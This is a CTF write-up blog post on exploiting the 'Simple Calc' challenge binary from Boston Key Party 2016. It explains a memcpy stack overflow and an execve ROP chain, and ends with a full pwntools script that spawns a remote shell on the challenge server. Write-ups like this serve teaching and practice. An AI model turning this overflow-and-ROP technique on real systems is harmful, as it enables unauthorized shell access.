---
layout: post
title:  "Boston Key Party - PWN 5 ‘Simple Calc’"
date:   2016-03-06
categories: ctf pwn
---

Running strings we see this is a x86_64 binary _statically compiled_, which should make things a lot easier for us.

{% highlight bash %}
vagrant@kali:/vagrant/ctfs/bostonkp2016$ file simplecalc
simplecalc: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0x0676a83cc38d2b9b20c612f4d7a19255eaa93b52, not stripped
{% endhighlight %}

Running the application, with IDA open on the side to quickly get past any restriction, I see that this program simply takes some number of calculations and then for each it allows you to choose wish operation to perform and the two operands. Both operands must be greater than 39, and the input and result are 4 byte ints. There are 12 global variables, three for each operation, and one for each operand and the result, plus four bytes padding between each set to maintain alignment.

When you first choose how many calculation to make, an appropriately size buffer is `malloc`ed and the result of each is saved. If you decide to quit out early, then the buffer is `memcpy`d to a buffer on the stack, which gives us our stack smashing opportunity -- Just select more operations than the stack buffer can fit the results for. This will, however, overwrite the pointer to the alloc'd buffer, causing the `free` call to crash, but we can easily get around that: `free(0)` short circuits and returns, so all we need to do is overwrite the stack will nulls, which we can do by subtracting some number from itself.

Now that I have RIP, I need to exploit it. Stack is NX, and I can't find "/bin/*sh" in a static part of the binary, nor is there a `system`. This rules out ret2libc, and we will have to do a ROP.

This was my first non-trivial ROP (and some would argue it's still trivial), so I will go into how I did it.

First I needed to figure out how to make the syscall. I found some simple shellcode [here](http://imgur.com/HbgCv5u), and figured out what it was doing:

* Set AL to 0x3B
* Set RDX to NULL
* Set RDI to point to "/bin/sh\0"
* Set RSI to point to a pointer to "/bin/sh\0" followed by NULL.

Since we are on x86_64, this requires two 'operations' so that we write eight bytes. This also gives us another problem: The stack location is unpredictable, where do we put this arg array and string? Lucky for us, we have easily controllable global vars. Once we set up the ROP chain on the stack, we can re-run dummy operations to overwrite the global 'cache' of operands and results.

To do this I simply 'divided' "/bin" by "/sh\0", which puts "/bin/sh\0" at the `divv` symbol. For the array, it was a bit trickier: I needed something with 12 NULL bytes after (4 to cover the second half of the pointer, and 8 more for the second elements). Since `sub` was at the end, I could do this. I put the address of `divv` as both operands of a sub operation, which would result in a NULL result, plus the four bytes following would be NULL (since the section is .bss). Unfortunately I hit another problem: In practice, a symbol soon after the sub result, `_dl_tls_static_used` was set to 0x60. To get around this, I would need an extra ROP gadget to write over this value with 0.

In the end, I ended up with what I think is a pretty elegant solution:

{% highlight python %}
import struct

def write_addr(addr):
    return ADD + str(addr-40) + "\n" + "40\n" + NULL

# Commands
ADD = "1\n"
SUB = "2\n"
MUL = "3\n"
DIV = "4\n"
DONE = "5\n"
NULL = SUB+"40\n"+"40\n"
# Gadgets
POP_RDI = write_addr(0x00401b73)
POP_RAX = write_addr(0x0044db34)
POP_RDX = write_addr(0x00437a85)
POP_RSI = write_addr(0x00401c87)
MOV_EDX_TO_AT_RAX = write_addr(0x0044526f)
SYSCALL = write_addr(0x004648e5)
# Globals
addX = 0x6C4A80
addY = addX + 4
addRes = addY + 4
divX = addRes + 8
divY = divX + 4
divRes = divY + 4
mulX = divRes + 8
mulY = mulX + 4
mulRes = mulY + 4
subX = mulRes + 8
subY = subX + 4
subRes = subY + 4
_dl_tls_static_used = 0x6C4AC0

# Build commands
commands = [
    "100\n",  # Any large number
    NULL*18,  # Get to RA
    # Set _dl_tls_static_used to 0
    POP_RAX,
    write_addr(_dl_tls_static_used),
    POP_RDX,
    NULL, NULL,
    MOV_EDX_TO_AT_RAX,
    # Now get ready for syscall
    POP_RDI,
    write_addr(divX),  # divX holds the string "/bin/sh"
    POP_RAX,
    SUB + str(0x3b + 4096) + "\n" + "4096\n" + NULL,  # 0x3b = execve
    POP_RDX,
    NULL, NULL,  # RDX should be null
    POP_RSI,  # RSI should point to an array that has a pointer to "/bin/sh" and a null pointer
    write_addr(subY),
    SYSCALL,
    # Now we need to populate the global vars by running extra calcs
    # -- Put "/bin/sh" at addX
    DIV + str(struct.unpack("<I", b"/bin")[0]) + "\n",
    str(struct.unpack("<I", b"/sh\x00")[0]) + "\n",
    # -- Put pointer to divX at subY with null after
    SUB + str(divX) + "\n" + str(divX) + "\n",
    DONE
]

from pwn import *

r = remote("simplecalc.bostonkey.party", 5400)
garbage = r.recv()
r.send("".join(commands))
r.interactive()
{% endhighlight %}
